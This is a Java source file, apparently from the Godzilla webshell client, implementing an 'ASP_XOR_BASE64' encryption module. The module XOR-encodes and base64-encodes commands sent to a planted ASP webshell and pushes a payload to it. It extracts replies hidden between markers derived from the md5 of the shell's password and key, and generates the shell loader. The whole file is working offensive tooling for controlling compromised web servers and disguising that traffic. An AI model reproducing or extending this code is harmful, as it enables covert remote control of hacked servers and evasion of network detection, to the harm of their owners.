package shells.cryptions.aspXor;

import core.annotation.CryptionAnnotation;
import core.imp.Cryption;
import core.shell.ShellEntity;
import java.net.URLEncoder;
import util.Log;
import util.functions;
import util.http.Http;

@CryptionAnnotation(Name = "ASP_XOR_BASE64", payloadName = "AspDynamicPayload")
public class AspXorBae64
  implements Cryption
{
  private ShellEntity shell;
  private Http http;
  private byte[] key;
  private boolean state;
  private String pass;
  private byte[] payload;
  private String findStrLeft;
  private String findStrRight;
  
  public void init(ShellEntity context) {
    this.shell = context;
    this.http = this.shell.getHttp();
    this.key = this.shell.getSecretKeyX().getBytes();
    this.pass = this.shell.getPassword();
    String findStrMd5 = functions.md5(this.pass + new String(this.key));
    this.findStrLeft = findStrMd5.substring(0, 6);
    this.findStrRight = findStrMd5.substring(20, 26);
    try {
      this.payload = this.shell.getPayloadModule().getPayload();
      if (this.payload != null) {
        this.http.sendHttpResponse(this.payload);
        this.state = true;
      } else {
        Log.error("payload Is Null");
      }
    
    } catch (Exception e) {
      Log.error(e);
      return;
    } 
  }


  
  public byte[] encode(byte[] data) {
    try {
      return E(data);
    } catch (Exception e) {
      Log.error(e);
      return null;
    } 
  }


  
  public byte[] decode(byte[] data) {
    if (data != null && data.length > 0) {
      try {
        return D(findStr(data));
      } catch (Exception e) {
        Log.error(e);
        return null;
      } 
    }
    return data;
  }




  
  public boolean isSendRLData() {
    return true;
  }
  
  protected void decryption(byte[] data, byte[] key) {
    int len = data.length;
    int keyLen = key.length;
    int index = 0;
    for (int i = 1; i <= len; i++) {
      index = i - 1;
      data[index] = (byte)(data[index] ^ key[i % keyLen]);
    } 
  }

  
  public byte[] E(byte[] cs) {
    decryption(cs, this.key);
    return (this.pass + "=" + URLEncoder.encode(functions.base64EncodeToString(cs))).getBytes();
  }
  public byte[] D(String data) {
    byte[] cs = functions.base64Decode(data);
    
    decryption(cs, this.key);
    return cs;
  }
  public String findStr(byte[] respResult) {
    String htmlString = new String(respResult);
    return functions.subMiddleStr(htmlString, this.findStrLeft, this.findStrRight);
  }

  
  public boolean check() {
    return this.state;
  }


  
  public byte[] generate(String password, String secretKey) {
    return Generate.GenerateShellLoder(password, functions.md5(secretKey).substring(0, 16), getClass().getSimpleName());
  }
}
